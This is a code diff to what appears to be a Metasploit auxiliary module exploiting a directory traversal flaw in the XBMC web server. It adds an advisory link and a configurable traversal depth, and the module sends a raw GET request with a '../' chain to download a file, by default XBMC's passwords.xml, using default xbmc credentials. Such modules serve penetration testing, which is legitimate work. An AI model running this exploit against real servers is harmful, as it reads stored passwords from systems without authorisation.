@@ -31,6 +31,7 @@ class Metasploit3 < Msf::Auxiliary
 				[
 					['URL', 'http://forum.xbmc.org/showthread.php?tid=144110&pid=1227348'],
 					['URL', 'https://github.com/xbmc/xbmc/commit/bdff099c024521941cb0956fe01d99ab52a65335'],
+					['URL', 'http://www.ioactive.com/pdfs/Security_Advisory_XBMC.pdf'],
 				],
 			'DisclosureDate' => "Nov 4 2012"
 		))
@@ -39,6 +40,7 @@ class Metasploit3 < Msf::Auxiliary
 			[
 				Opt::RPORT(8080),
 				OptString.new('FILEPATH', [false, 'The name of the file to download', '/private/var/mobile/Library/Preferences/XBMC/userdata/passwords.xml']),
+				OptInt.new('DEPTH', [true, 'The max traversal depth', 9]),
 				OptString.new('USER', [true, 'The username to use for the HTTP server', 'xbmc']),
 				OptString.new('PASS', [true, 'The password to use for the HTTP server', 'xbmc']),
 			], self.class)
@@ -54,7 +56,7 @@ class Metasploit3 < Msf::Auxiliary
 		end
 
 		# Create request
-		traversal = "../../../../../../../../.." #The longest of all platforms tested was 9 deep
+		traversal = "../" * datastore['DEPTH'] #The longest of all platforms tested was 9 deep
 		res = send_request_raw({
 			'method' => 'GET',
 			'uri'    => "/#{traversal}/#{datastore['FILEPATH']}",
